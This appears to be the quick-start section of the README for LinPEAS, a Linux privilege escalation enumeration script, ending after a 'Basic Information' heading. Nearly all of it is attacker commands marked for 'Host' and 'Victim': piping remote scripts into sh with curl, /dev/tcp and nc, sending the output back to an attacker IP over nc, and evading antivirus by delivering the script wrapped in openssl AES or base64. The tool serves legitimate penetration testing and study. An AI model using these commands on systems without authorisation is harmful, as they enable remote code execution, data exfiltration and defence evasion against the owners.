LinPEAS - Linux Privilege Escalation Awesome Script

LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts
------------------------
Quick Start

 # From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

---------------------
# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
---------------------
# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
------------------------------------------------------------
 #AV bypass

#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim

--------------------------------------------------------------------
Basic Information
